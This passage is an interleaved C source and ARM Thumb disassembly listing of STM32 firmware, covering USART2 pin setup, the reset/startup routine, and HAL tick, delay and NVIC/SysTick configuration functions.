    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 80011f4:	2302      	movs	r3, #2
 80011f6:	66bb      	str	r3, [r7, #104]	; 0x68
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 80011f8:	2300      	movs	r3, #0
 80011fa:	66fb      	str	r3, [r7, #108]	; 0x6c
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 80011fc:	2303      	movs	r3, #3
 80011fe:	673b      	str	r3, [r7, #112]	; 0x70
    GPIO_InitStruct.Alternate = GPIO_AF7_USART2;
 8001200:	2307      	movs	r3, #7
 8001202:	677b      	str	r3, [r7, #116]	; 0x74
    HAL_GPIO_Init(VCP_TX_GPIO_Port, &GPIO_InitStruct);
 8001204:	f107 0364 	add.w	r3, r7, #100	; 0x64
 8001208:	4619      	mov	r1, r3
 800120a:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 800120e:	f000 fc67 	bl	8001ae0 <HAL_GPIO_Init>

    GPIO_InitStruct.Pin = VCP_RX_Pin;
 8001212:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 8001216:	667b      	str	r3, [r7, #100]	; 0x64
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 8001218:	2302      	movs	r3, #2
 800121a:	66bb      	str	r3, [r7, #104]	; 0x68
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 800121c:	2300      	movs	r3, #0
 800121e:	66fb      	str	r3, [r7, #108]	; 0x6c
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 8001220:	2303      	movs	r3, #3
 8001222:	673b      	str	r3, [r7, #112]	; 0x70
    GPIO_InitStruct.Alternate = GPIO_AF3_USART2;
 8001224:	2303      	movs	r3, #3
 8001226:	677b      	str	r3, [r7, #116]	; 0x74
    HAL_GPIO_Init(VCP_RX_GPIO_Port, &GPIO_InitStruct);
 8001228:	f107 0364 	add.w	r3, r7, #100	; 0x64
 800122c:	4619      	mov	r1, r3
 800122e:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8001232:	f000 fc55 	bl	8001ae0 <HAL_GPIO_Init>

  /* USER CODE BEGIN USART2_MspInit 1 */

  /* USER CODE END USART2_MspInit 1 */
  }
}
 8001236:	bf00      	nop
 8001238:	3778      	adds	r7, #120	; 0x78
 800123a:	46bd      	mov	sp, r7
 800123c:	bd80      	pop	{r7, pc}
 800123e:	bf00      	nop
 8001240:	40004400 	.word	0x40004400
 8001244:	40021000 	.word	0x40021000

08001248 <Reset_Handler>:

    .section	.text.Reset_Handler
	.weak	Reset_Handler
	.type	Reset_Handler, %function
Reset_Handler:
  ldr   sp, =_estack    /* Set stack pointer */
 8001248:	f8df d034 	ldr.w	sp, [pc, #52]	; 8001280 <LoopForever+0x2>

/* Call the clock system initialization function.*/
    bl  SystemInit
 800124c:	f7ff fede 	bl	800100c <SystemInit>

/* Copy the data segment initializers from flash to SRAM */
  ldr r0, =_sdata
 8001250:	480c      	ldr	r0, [pc, #48]	; (8001284 <LoopForever+0x6>)
  ldr r1, =_edata
 8001252:	490d      	ldr	r1, [pc, #52]	; (8001288 <LoopForever+0xa>)
  ldr r2, =_sidata
 8001254:	4a0d      	ldr	r2, [pc, #52]	; (800128c <LoopForever+0xe>)
  movs r3, #0
 8001256:	2300      	movs	r3, #0
  b LoopCopyDataInit
 8001258:	e002      	b.n	8001260 <LoopCopyDataInit>

0800125a <CopyDataInit>:

CopyDataInit:
  ldr r4, [r2, r3]
 800125a:	58d4      	ldr	r4, [r2, r3]
  str r4, [r0, r3]
 800125c:	50c4      	str	r4, [r0, r3]
  adds r3, r3, #4
 800125e:	3304      	adds	r3, #4

08001260 <LoopCopyDataInit>:

LoopCopyDataInit:
  adds r4, r0, r3
 8001260:	18c4      	adds	r4, r0, r3
  cmp r4, r1
 8001262:	428c      	cmp	r4, r1
  bcc CopyDataInit
 8001264:	d3f9      	bcc.n	800125a <CopyDataInit>
  
/* Zero fill the bss segment. */
  ldr r2, =_sbss
 8001266:	4a0a      	ldr	r2, [pc, #40]	; (8001290 <LoopForever+0x12>)
  ldr r4, =_ebss
 8001268:	4c0a      	ldr	r4, [pc, #40]	; (8001294 <LoopForever+0x16>)
  movs r3, #0
 800126a:	2300      	movs	r3, #0
  b LoopFillZerobss
 800126c:	e001      	b.n	8001272 <LoopFillZerobss>

0800126e <FillZerobss>:

FillZerobss:
  str  r3, [r2]
 800126e:	6013      	str	r3, [r2, #0]
  adds r2, r2, #4
 8001270:	3204      	adds	r2, #4

08001272 <LoopFillZerobss>:

LoopFillZerobss:
  cmp r2, r4
 8001272:	42a2      	cmp	r2, r4
  bcc FillZerobss
 8001274:	d3fb      	bcc.n	800126e <FillZerobss>

/* Call static constructors */
    bl __libc_init_array
 8001276:	f00b ff97 	bl	800d1a8 <__libc_init_array>
/* Call the application's entry point.*/
	bl	main
 800127a:	f7ff f985 	bl	8000588 <main>

0800127e <LoopForever>:

LoopForever:
    b LoopForever
 800127e:	e7fe      	b.n	800127e <LoopForever>
  ldr   sp, =_estack    /* Set stack pointer */
 8001280:	20010000 	.word	0x20010000
  ldr r0, =_sdata
 8001284:	20000000 	.word	0x20000000
  ldr r1, =_edata
 8001288:	20000240 	.word	0x20000240
  ldr r2, =_sidata
 800128c:	0800d468 	.word	0x0800d468
  ldr r2, =_sbss
 8001290:	20000240 	.word	0x20000240
  ldr r4, =_ebss
 8001294:	20001f14 	.word	0x20001f14

08001298 <ADC1_IRQHandler>:
 * @retval : None
*/
    .section	.text.Default_Handler,"ax",%progbits
Default_Handler:
Infinite_Loop:
	b	Infinite_Loop
 8001298:	e7fe      	b.n	8001298 <ADC1_IRQHandler>

0800129a <HAL_Init>:
  *         each 1ms in the SysTick_Handler() interrupt handler.
  *
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_Init(void)
{
 800129a:	b580      	push	{r7, lr}
 800129c:	b082      	sub	sp, #8
 800129e:	af00      	add	r7, sp, #0
  HAL_StatusTypeDef  status = HAL_OK;
 80012a0:	2300      	movs	r3, #0
 80012a2:	71fb      	strb	r3, [r7, #7]
#if (PREFETCH_ENABLE != 0)
  __HAL_FLASH_PREFETCH_BUFFER_ENABLE();
#endif /* PREFETCH_ENABLE */

  /* Set Interrupt Group Priority */
  HAL_NVIC_SetPriorityGrouping(NVIC_PRIORITYGROUP_4);
 80012a4:	2003      	movs	r0, #3
 80012a6:	f000 f961 	bl	800156c <HAL_NVIC_SetPriorityGrouping>

  /* Use SysTick as time base source and configure 1ms tick (default clock after Reset is MSI) */
  if (HAL_InitTick(TICK_INT_PRIORITY) != HAL_OK)
 80012aa:	2000      	movs	r0, #0
 80012ac:	f000 f80e 	bl	80012cc <HAL_InitTick>
 80012b0:	4603      	mov	r3, r0
 80012b2:	2b00      	cmp	r3, #0
 80012b4:	d002      	beq.n	80012bc <HAL_Init+0x22>
  {
    status = HAL_ERROR;
 80012b6:	2301      	movs	r3, #1
 80012b8:	71fb      	strb	r3, [r7, #7]
 80012ba:	e001      	b.n	80012c0 <HAL_Init+0x26>
  }
  else
  {
    /* Init the low level hardware */
    HAL_MspInit();
 80012bc:	f7ff fe44 	bl	8000f48 <HAL_MspInit>
  }

  /* Return function status */
  return status;
 80012c0:	79fb      	ldrb	r3, [r7, #7]
}
 80012c2:	4618      	mov	r0, r3
 80012c4:	3708      	adds	r7, #8
 80012c6:	46bd      	mov	sp, r7
 80012c8:	bd80      	pop	{r7, pc}
	...

080012cc <HAL_InitTick>:
  *       implementation  in user file.
  * @param TickPriority  Tick interrupt priority.
  * @retval HAL status
  */
__weak HAL_StatusTypeDef HAL_InitTick(uint32_t TickPriority)
{
 80012cc:	b580      	push	{r7, lr}
 80012ce:	b084      	sub	sp, #16
 80012d0:	af00      	add	r7, sp, #0
 80012d2:	6078      	str	r0, [r7, #4]
  HAL_StatusTypeDef  status = HAL_OK;
 80012d4:	2300      	movs	r3, #0
 80012d6:	73fb      	strb	r3, [r7, #15]

  /* Check uwTickFreq for MisraC 2012 (even if uwTickFreq is a enum type that doesn't take the value zero)*/
  if ((uint32_t)uwTickFreq != 0U)
 80012d8:	4b17      	ldr	r3, [pc, #92]	; (8001338 <HAL_InitTick+0x6c>)
 80012da:	781b      	ldrb	r3, [r3, #0]
 80012dc:	2b00      	cmp	r3, #0
 80012de:	d023      	beq.n	8001328 <HAL_InitTick+0x5c>
  {
    /*Configure the SysTick to have interrupt in 1ms time basis*/
    if (HAL_SYSTICK_Config(SystemCoreClock / (1000U / (uint32_t)uwTickFreq)) == 0U)
 80012e0:	4b16      	ldr	r3, [pc, #88]	; (800133c <HAL_InitTick+0x70>)
 80012e2:	681a      	ldr	r2, [r3, #0]
 80012e4:	4b14      	ldr	r3, [pc, #80]	; (8001338 <HAL_InitTick+0x6c>)
 80012e6:	781b      	ldrb	r3, [r3, #0]
 80012e8:	4619      	mov	r1, r3
 80012ea:	f44f 737a 	mov.w	r3, #1000	; 0x3e8
 80012ee:	fbb3 f3f1 	udiv	r3, r3, r1
 80012f2:	fbb2 f3f3 	udiv	r3, r2, r3
 80012f6:	4618      	mov	r0, r3
 80012f8:	f000 f96d 	bl	80015d6 <HAL_SYSTICK_Config>
 80012fc:	4603      	mov	r3, r0
 80012fe:	2b00      	cmp	r3, #0
 8001300:	d10f      	bne.n	8001322 <HAL_InitTick+0x56>
    {
      /* Configure the SysTick IRQ priority */
      if (TickPriority < (1UL << __NVIC_PRIO_BITS))
 8001302:	687b      	ldr	r3, [r7, #4]
 8001304:	2b0f      	cmp	r3, #15
 8001306:	d809      	bhi.n	800131c <HAL_InitTick+0x50>
      {
        HAL_NVIC_SetPriority(SysTick_IRQn, TickPriority, 0U);
 8001308:	2200      	movs	r2, #0
 800130a:	6879      	ldr	r1, [r7, #4]
 800130c:	f04f 30ff 	mov.w	r0, #4294967295
 8001310:	f000 f937 	bl	8001582 <HAL_NVIC_SetPriority>
        uwTickPrio = TickPriority;
 8001314:	4a0a      	ldr	r2, [pc, #40]	; (8001340 <HAL_InitTick+0x74>)
 8001316:	687b      	ldr	r3, [r7, #4]
 8001318:	6013      	str	r3, [r2, #0]
 800131a:	e007      	b.n	800132c <HAL_InitTick+0x60>
      }
      else
      {
        status = HAL_ERROR;
 800131c:	2301      	movs	r3, #1
 800131e:	73fb      	strb	r3, [r7, #15]
 8001320:	e004      	b.n	800132c <HAL_InitTick+0x60>
      }
    }
    else
    {
      status = HAL_ERROR;
 8001322:	2301      	movs	r3, #1
 8001324:	73fb      	strb	r3, [r7, #15]
 8001326:	e001      	b.n	800132c <HAL_InitTick+0x60>
    }
  }
  else
  {
    status = HAL_ERROR;
 8001328:	2301      	movs	r3, #1
 800132a:	73fb      	strb	r3, [r7, #15]
  }

  /* Return function status */
  return status;
 800132c:	7bfb      	ldrb	r3, [r7, #15]
}
 800132e:	4618      	mov	r0, r3
 8001330:	3710      	adds	r7, #16
 8001332:	46bd      	mov	sp, r7
 8001334:	bd80      	pop	{r7, pc}
 8001336:	bf00      	nop
 8001338:	20000008 	.word	0x20000008
 800133c:	20000000 	.word	0x20000000
 8001340:	20000004 	.word	0x20000004

08001344 <HAL_IncTick>:
 * @note This function is declared as __weak to be overwritten in case of other
  *      implementations in user file.
  * @retval None
  */
__weak void HAL_IncTick(void)
{
 8001344:	b480      	push	{r7}
 8001346:	af00      	add	r7, sp, #0
  uwTick += (uint32_t)uwTickFreq;
 8001348:	4b06      	ldr	r3, [pc, #24]	; (8001364 <HAL_IncTick+0x20>)
 800134a:	781b      	ldrb	r3, [r3, #0]
 800134c:	461a      	mov	r2, r3
 800134e:	4b06      	ldr	r3, [pc, #24]	; (8001368 <HAL_IncTick+0x24>)
 8001350:	681b      	ldr	r3, [r3, #0]
 8001352:	4413      	add	r3, r2
 8001354:	4a04      	ldr	r2, [pc, #16]	; (8001368 <HAL_IncTick+0x24>)
 8001356:	6013      	str	r3, [r2, #0]
}
 8001358:	bf00      	nop
 800135a:	46bd      	mov	sp, r7
 800135c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001360:	4770      	bx	lr
 8001362:	bf00      	nop
 8001364:	20000008 	.word	0x20000008
 8001368:	200003b8 	.word	0x200003b8

0800136c <HAL_GetTick>:
  * @note This function is declared as __weak to be overwritten in case of other
  *       implementations in user file.
  * @retval tick value
  */
__weak uint32_t HAL_GetTick(void)
{
 800136c:	b480      	push	{r7}
 800136e:	af00      	add	r7, sp, #0
  return uwTick;
 8001370:	4b03      	ldr	r3, [pc, #12]	; (8001380 <HAL_GetTick+0x14>)
 8001372:	681b      	ldr	r3, [r3, #0]
}
 8001374:	4618      	mov	r0, r3
 8001376:	46bd      	mov	sp, r7
 8001378:	f85d 7b04 	ldr.w	r7, [sp], #4
 800137c:	4770      	bx	lr
 800137e:	bf00      	nop
 8001380:	200003b8 	.word	0x200003b8

08001384 <HAL_Delay>:
  *       implementations in user file.
  * @param Delay  specifies the delay time length, in milliseconds.
  * @retval None
  */
__weak void HAL_Delay(uint32_t Delay)
{
 8001384:	b580      	push	{r7, lr}
 8001386:	b084      	sub	sp, #16
 8001388:	af00      	add	r7, sp, #0
 800138a:	6078      	str	r0, [r7, #4]
  uint32_t tickstart = HAL_GetTick();
 800138c:	f7ff ffee 	bl	800136c <HAL_GetTick>
 8001390:	60b8      	str	r0, [r7, #8]
  uint32_t wait = Delay;
 8001392:	687b      	ldr	r3, [r7, #4]
 8001394:	60fb      	str	r3, [r7, #12]

  /* Add a period to guaranty minimum wait */
  if (wait < HAL_MAX_DELAY)
 8001396:	68fb      	ldr	r3, [r7, #12]
 8001398:	f1b3 3fff 	cmp.w	r3, #4294967295
 800139c:	d005      	beq.n	80013aa <HAL_Delay+0x26>
  {
    wait += (uint32_t)uwTickFreq;
 800139e:	4b0a      	ldr	r3, [pc, #40]	; (80013c8 <HAL_Delay+0x44>)
 80013a0:	781b      	ldrb	r3, [r3, #0]
 80013a2:	461a      	mov	r2, r3
 80013a4:	68fb      	ldr	r3, [r7, #12]
 80013a6:	4413      	add	r3, r2
 80013a8:	60fb      	str	r3, [r7, #12]
  }

  while ((HAL_GetTick() - tickstart) < wait)
 80013aa:	bf00      	nop
 80013ac:	f7ff ffde 	bl	800136c <HAL_GetTick>
 80013b0:	4602      	mov	r2, r0
 80013b2:	68bb      	ldr	r3, [r7, #8]
 80013b4:	1ad3      	subs	r3, r2, r3
 80013b6:	68fa      	ldr	r2, [r7, #12]
 80013b8:	429a      	cmp	r2, r3
 80013ba:	d8f7      	bhi.n	80013ac <HAL_Delay+0x28>
  {
  }
}
 80013bc:	bf00      	nop
 80013be:	bf00      	nop
 80013c0:	3710      	adds	r7, #16
 80013c2:	46bd      	mov	sp, r7
 80013c4:	bd80      	pop	{r7, pc}
 80013c6:	bf00      	nop
 80013c8:	20000008 	.word	0x20000008

080013cc <__NVIC_SetPriorityGrouping>:
           In case of a conflict between priority grouping and available
           priority bits (__NVIC_PRIO_BITS), the smallest possible priority group is set.
  \param [in]      PriorityGroup  Priority grouping field.
 */
__STATIC_INLINE void __NVIC_SetPriorityGrouping(uint32_t PriorityGroup)
{
 80013cc:	b480      	push	{r7}
 80013ce:	b085      	sub	sp, #20
 80013d0:	af00      	add	r7, sp, #0
 80013d2:	6078      	str	r0, [r7, #4]
  uint32_t reg_value;
  uint32_t PriorityGroupTmp = (PriorityGroup & (uint32_t)0x07UL);             /* only values 0..7 are used          */
 80013d4:	687b      	ldr	r3, [r7, #4]
 80013d6:	f003 0307 	and.w	r3, r3, #7
 80013da:	60fb      	str	r3, [r7, #12]

  reg_value  =  SCB->AIRCR;                                                   /* read old register configuration    */
 80013dc:	4b0c      	ldr	r3, [pc, #48]	; (8001410 <__NVIC_SetPriorityGrouping+0x44>)
 80013de:	68db      	ldr	r3, [r3, #12]
 80013e0:	60bb      	str	r3, [r7, #8]
  reg_value &= ~((uint32_t)(SCB_AIRCR_VECTKEY_Msk | SCB_AIRCR_PRIGROUP_Msk)); /* clear bits to change               */
 80013e2:	68ba      	ldr	r2, [r7, #8]
 80013e4:	f64f 03ff 	movw	r3, #63743	; 0xf8ff
 80013e8:	4013      	ands	r3, r2
 80013ea:	60bb      	str	r3, [r7, #8]
  reg_value  =  (reg_value                                   |
                ((uint32_t)0x5FAUL << SCB_AIRCR_VECTKEY_Pos) |
                (PriorityGroupTmp << SCB_AIRCR_PRIGROUP_Pos)  );              /* Insert write key and priority group */
 80013ec:	68fb      	ldr	r3, [r7, #12]
 80013ee:	021a      	lsls	r2, r3, #8
                ((uint32_t)0x5FAUL << SCB_AIRCR_VECTKEY_Pos) |
 80013f0:	68bb      	ldr	r3, [r7, #8]
 80013f2:	4313      	orrs	r3, r2
  reg_value  =  (reg_value                                   |
 80013f4:	f043 63bf 	orr.w	r3, r3, #100139008	; 0x5f80000
 80013f8:	f443 3300 	orr.w	r3, r3, #131072	; 0x20000
 80013fc:	60bb      	str	r3, [r7, #8]
  SCB->AIRCR =  reg_value;
 80013fe:	4a04      	ldr	r2, [pc, #16]	; (8001410 <__NVIC_SetPriorityGrouping+0x44>)
 8001400:	68bb      	ldr	r3, [r7, #8]
 8001402:	60d3      	str	r3, [r2, #12]
}
 8001404:	bf00      	nop
 8001406:	3714      	adds	r7, #20
 8001408:	46bd      	mov	sp, r7
 800140a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800140e:	4770      	bx	lr
 8001410:	e000ed00 	.word	0xe000ed00

08001414 <__NVIC_GetPriorityGrouping>:
  \brief   Get Priority Grouping
  \details Reads the priority grouping field from the NVIC Interrupt Controller.
  \return                Priority grouping field (SCB->AIRCR [10:8] PRIGROUP field).
 */
__STATIC_INLINE uint32_t __NVIC_GetPriorityGrouping(void)
{
 8001414:	b480      	push	{r7}
 8001416:	af00      	add	r7, sp, #0
  return ((uint32_t)((SCB->AIRCR & SCB_AIRCR_PRIGROUP_Msk) >> SCB_AIRCR_PRIGROUP_Pos));
 8001418:	4b04      	ldr	r3, [pc, #16]	; (800142c <__NVIC_GetPriorityGrouping+0x18>)
 800141a:	68db      	ldr	r3, [r3, #12]
 800141c:	0a1b      	lsrs	r3, r3, #8
 800141e:	f003 0307 	and.w	r3, r3, #7
}
 8001422:	4618      	mov	r0, r3
 8001424:	46bd      	mov	sp, r7
 8001426:	f85d 7b04 	ldr.w	r7, [sp], #4
 800142a:	4770      	bx	lr
 800142c:	e000ed00 	.word	0xe000ed00

08001430 <__NVIC_EnableIRQ>:
  \details Enables a device specific interrupt in the NVIC interrupt controller.
  \param [in]      IRQn  Device specific interrupt number.
  \note    IRQn must not be negative.
 */
__STATIC_INLINE void __NVIC_EnableIRQ(IRQn_Type IRQn)
{
 8001430:	b480      	push	{r7}
 8001432:	b083      	sub	sp, #12
 8001434:	af00      	add	r7, sp, #0
 8001436:	4603      	mov	r3, r0
 8001438:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 800143a:	f997 3007 	ldrsb.w	r3, [r7, #7]
 800143e:	2b00      	cmp	r3, #0
 8001440:	db0b      	blt.n	800145a <__NVIC_EnableIRQ+0x2a>
  {
    __COMPILER_BARRIER();
    NVIC->ISER[(((uint32_t)IRQn) >> 5UL)] = (uint32_t)(1UL << (((uint32_t)IRQn) & 0x1FUL));
 8001442:	79fb      	ldrb	r3, [r7, #7]
 8001444:	f003 021f 	and.w	r2, r3, #31
 8001448:	4907      	ldr	r1, [pc, #28]	; (8001468 <__NVIC_EnableIRQ+0x38>)
 800144a:	f997 3007 	ldrsb.w	r3, [r7, #7]
 800144e:	095b      	lsrs	r3, r3, #5
 8001450:	2001      	movs	r0, #1
 8001452:	fa00 f202 	lsl.w	r2, r0, r2
 8001456:	f841 2023 	str.w	r2, [r1, r3, lsl #2]
    __COMPILER_BARRIER();
  }
}
 800145a:	bf00      	nop
 800145c:	370c      	adds	r7, #12
 800145e:	46bd      	mov	sp, r7
 8001460:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001464:	4770      	bx	lr
 8001466:	bf00      	nop
 8001468:	e000e100 	.word	0xe000e100

0800146c <__NVIC_SetPriority>:
  \param [in]      IRQn  Interrupt number.
  \param [in]  priority  Priority to set.
  \note    The priority cannot be set for every processor exception.
 */
__STATIC_INLINE void __NVIC_SetPriority(IRQn_Type IRQn, uint32_t priority)
{
 800146c:	b480      	push	{r7}
 800146e:	b083      	sub	sp, #12
 8001470:	af00      	add	r7, sp, #0
 8001472:	4603      	mov	r3, r0
 8001474:	6039      	str	r1, [r7, #0]
 8001476:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 8001478:	f997 3007 	ldrsb.w	r3, [r7, #7]
 800147c:	2b00      	cmp	r3, #0
 800147e:	db0a      	blt.n	8001496 <__NVIC_SetPriority+0x2a>
  {
    NVIC->IP[((uint32_t)IRQn)]               = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 8001480:	683b      	ldr	r3, [r7, #0]
 8001482:	b2da      	uxtb	r2, r3
 8001484:	490c      	ldr	r1, [pc, #48]	; (80014b8 <__NVIC_SetPriority+0x4c>)
 8001486:	f997 3007 	ldrsb.w	r3, [r7, #7]
 800148a:	0112      	lsls	r2, r2, #4
 800148c:	b2d2      	uxtb	r2, r2
 800148e:	440b      	add	r3, r1
 8001490:	f883 2300 	strb.w	r2, [r3, #768]	; 0x300
  }
  else
  {
    SCB->SHP[(((uint32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
  }
}
 8001494:	e00a      	b.n	80014ac <__NVIC_SetPriority+0x40>
    SCB->SHP[(((uint32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 8001496:	683b      	ldr	r3, [r7, #0]
 8001498:	b2da      	uxtb	r2, r3
 800149a:	4908      	ldr	r1, [pc, #32]	; (80014bc <__NVIC_SetPriority+0x50>)
 800149c:	79fb      	ldrb	r3, [r7, #7]
 800149e:	f003 030f 	and.w	r3, r3, #15
 80014a2:	3b04      	subs	r3, #4
 80014a4:	0112      	lsls	r2, r2, #4
 80014a6:	b2d2      	uxtb	r2, r2
 80014a8:	440b      	add	r3, r1
 80014aa:	761a      	strb	r2, [r3, #24]
}
 80014ac:	bf00      	nop
 80014ae:	370c      	adds	r7, #12
 80014b0:	46bd      	mov	sp, r7
 80014b2:	f85d 7b04 	ldr.w	r7, [sp], #4
 80014b6:	4770      	bx	lr
 80014b8:	e000e100 	.word	0xe000e100
 80014bc:	e000ed00 	.word	0xe000ed00

080014c0 <NVIC_EncodePriority>:
  \param [in]   PreemptPriority  Preemptive priority value (starting from 0).
  \param [in]       SubPriority  Subpriority value (starting from 0).
  \return                        Encoded priority. Value can be used in the function \ref NVIC_SetPriority().
 */
__STATIC_INLINE uint32_t NVIC_EncodePriority (uint32_t PriorityGroup, uint32_t PreemptPriority, uint32_t SubPriority)
{
 80014c0:	b480      	push	{r7}
 80014c2:	b089      	sub	sp, #36	; 0x24
 80014c4:	af00      	add	r7, sp, #0
 80014c6:	60f8      	str	r0, [r7, #12]
 80014c8:	60b9      	str	r1, [r7, #8]
 80014ca:	607a      	str	r2, [r7, #4]
  uint32_t PriorityGroupTmp = (PriorityGroup & (uint32_t)0x07UL);   /* only values 0..7 are used          */
 80014cc:	68fb      	ldr	r3, [r7, #12]
 80014ce:	f003 0307 	and.w	r3, r3, #7
 80014d2:	61fb      	str	r3, [r7, #28]
  uint32_t PreemptPriorityBits;
  uint32_t SubPriorityBits;

  PreemptPriorityBits = ((7UL - PriorityGroupTmp) > (uint32_t)(__NVIC_PRIO_BITS)) ? (uint32_t)(__NVIC_PRIO_BITS) : (uint32_t)(7UL - PriorityGroupTmp);
 80014d4:	69fb      	ldr	r3, [r7, #28]
 80014d6:	f1c3 0307 	rsb	r3, r3, #7
 80014da:	2b04      	cmp	r3, #4
 80014dc:	bf28      	it	cs
 80014de:	2304      	movcs	r3, #4
 80014e0:	61bb      	str	r3, [r7, #24]
  SubPriorityBits     = ((PriorityGroupTmp + (uint32_t)(__NVIC_PRIO_BITS)) < (uint32_t)7UL) ? (uint32_t)0UL : (uint32_t)((PriorityGroupTmp - 7UL) + (uint32_t)(__NVIC_PRIO_BITS));
 80014e2:	69fb      	ldr	r3, [r7, #28]
 80014e4:	3304      	adds	r3, #4
 80014e6:	2b06      	cmp	r3, #6
 80014e8:	d902      	bls.n	80014f0 <NVIC_EncodePriority+0x30>
 80014ea:	69fb      	ldr	r3, [r7, #28]
 80014ec:	3b03      	subs	r3, #3
 80014ee:	e000      	b.n	80014f2 <NVIC_EncodePriority+0x32>
 80014f0:	2300      	movs	r3, #0
 80014f2:	617b      	str	r3, [r7, #20]

  return (
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 80014f4:	f04f 32ff 	mov.w	r2, #4294967295
 80014f8:	69bb      	ldr	r3, [r7, #24]
 80014fa:	fa02 f303 	lsl.w	r3, r2, r3
 80014fe:	43da      	mvns	r2, r3
 8001500:	68bb      	ldr	r3, [r7, #8]
 8001502:	401a      	ands	r2, r3
 8001504:	697b      	ldr	r3, [r7, #20]
 8001506:	409a      	lsls	r2, r3
           ((SubPriority     & (uint32_t)((1UL << (SubPriorityBits    )) - 1UL)))
 8001508:	f04f 31ff 	mov.w	r1, #4294967295
 800150c:	697b      	ldr	r3, [r7, #20]
 800150e:	fa01 f303 	lsl.w	r3, r1, r3
 8001512:	43d9      	mvns	r1, r3
 8001514:	687b      	ldr	r3, [r7, #4]
 8001516:	400b      	ands	r3, r1
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 8001518:	4313      	orrs	r3, r2
         );
}
 800151a:	4618      	mov	r0, r3
 800151c:	3724      	adds	r7, #36	; 0x24
 800151e:	46bd      	mov	sp, r7
 8001520:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001524:	4770      	bx	lr
	...

08001528 <SysTick_Config>:
  \note    When the variable <b>__Vendor_SysTickConfig</b> is set to 1, then the
           function <b>SysTick_Config</b> is not included. In this case, the file <b><i>device</i>.h</b>
           must contain a vendor-specific implementation of this function.
 */
__STATIC_INLINE uint32_t SysTick_Config(uint32_t ticks)
{
 8001528:	b580      	push	{r7, lr}
 800152a:	b082      	sub	sp, #8
 800152c:	af00      	add	r7, sp, #0
 800152e:	6078      	str	r0, [r7, #4]
  if ((ticks - 1UL) > SysTick_LOAD_RELOAD_Msk)
 8001530:	687b      	ldr	r3, [r7, #4]
 8001532:	3b01      	subs	r3, #1
 8001534:	f1b3 7f80 	cmp.w	r3, #16777216	; 0x1000000
 8001538:	d301      	bcc.n	800153e <SysTick_Config+0x16>
  {
    return (1UL);                                                   /* Reload value impossible */
 800153a:	2301      	movs	r3, #1
 800153c:	e00f      	b.n	800155e <SysTick_Config+0x36>
  }

  SysTick->LOAD  = (uint32_t)(ticks - 1UL);                         /* set reload register */
 800153e:	4a0a      	ldr	r2, [pc, #40]	; (8001568 <SysTick_Config+0x40>)
 8001540:	687b      	ldr	r3, [r7, #4]
 8001542:	3b01      	subs	r3, #1
 8001544:	6053      	str	r3, [r2, #4]
  NVIC_SetPriority (SysTick_IRQn, (1UL << __NVIC_PRIO_BITS) - 1UL); /* set Priority for Systick Interrupt */
 8001546:	210f      	movs	r1, #15
 8001548:	f04f 30ff 	mov.w	r0, #4294967295
 800154c:	f7ff ff8e 	bl	800146c <__NVIC_SetPriority>
  SysTick->VAL   = 0UL;                                             /* Load the SysTick Counter Value */
 8001550:	4b05      	ldr	r3, [pc, #20]	; (8001568 <SysTick_Config+0x40>)
 8001552:	2200      	movs	r2, #0
 8001554:	609a      	str	r2, [r3, #8]
  SysTick->CTRL  = SysTick_CTRL_CLKSOURCE_Msk |
 8001556:	4b04      	ldr	r3, [pc, #16]	; (8001568 <SysTick_Config+0x40>)
 8001558:	2207      	movs	r2, #7
 800155a:	601a      	str	r2, [r3, #0]
                   SysTick_CTRL_TICKINT_Msk   |
                   SysTick_CTRL_ENABLE_Msk;                         /* Enable SysTick IRQ and SysTick Timer */
  return (0UL);                                                     /* Function successful */
 800155c:	2300      	movs	r3, #0
}
 800155e:	4618      	mov	r0, r3
 8001560:	3708      	adds	r7, #8
 8001562:	46bd      	mov	sp, r7
 8001564:	bd80      	pop	{r7, pc}
 8001566:	bf00      	nop
 8001568:	e000e010 	.word	0xe000e010

0800156c <HAL_NVIC_SetPriorityGrouping>:
  * @note   When the NVIC_PriorityGroup_0 is selected, IRQ pre-emption is no more possible.
  *         The pending IRQ priority will be managed only by the subpriority.
  * @retval None
  */
void HAL_NVIC_SetPriorityGrouping(uint32_t PriorityGroup)
{
 800156c:	b580      	push	{r7, lr}
 800156e:	b082      	sub	sp, #8
 8001570:	af00      	add	r7, sp, #0
 8001572:	6078      	str	r0, [r7, #4]
  /* Check the parameters */
  assert_param(IS_NVIC_PRIORITY_GROUP(PriorityGroup));

  /* Set the PRIGROUP[10:8] bits according to the PriorityGroup parameter value */
  NVIC_SetPriorityGrouping(PriorityGroup);
 8001574:	6878      	ldr	r0, [r7, #4]
 8001576:	f7ff ff29 	bl	80013cc <__NVIC_SetPriorityGrouping>
}
 800157a:	bf00      	nop
 800157c:	3708      	adds	r7, #8
 800157e:	46bd      	mov	sp, r7
 8001580:	bd80      	pop	{r7, pc}

08001582 <HAL_NVIC_SetPriority>:
  *         This parameter can be a value between 0 and 15
  *         A lower priority value indicates a higher priority.
  * @retval None
  */
void HAL_NVIC_SetPriority(IRQn_Type IRQn, uint32_t PreemptPriority, uint32_t SubPriority)
{
